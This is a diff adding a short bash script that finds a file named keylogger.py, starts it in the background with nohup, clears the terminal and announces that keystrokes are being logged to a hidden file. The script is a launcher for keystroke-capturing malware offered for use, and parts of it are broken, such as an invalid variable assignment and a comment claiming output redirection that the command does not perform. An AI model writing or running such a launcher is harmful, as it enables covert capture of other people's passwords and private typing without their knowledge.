@@ -1,0 +1,16 @@
+#!/bin/bash
+# Find the path of keylogger.py
+path=$(whereis keylogger.py | cut -d ":" -f 2)
+
+# Check if keylogger.py exists
+if [ -f $path ]; then
+	# Define a separate error log file
+	error_path = ".keyerror.log"
+	# Run keylogger.py in the background, redirecting both stdout and stderr to $error_path
+	nohup python3 $path &
+	clear
+	echo "Keylogger started. Logs are being written at .keystokes.log"
+else
+	clear
+	echo "keylogger.py not found in the system."
+fi
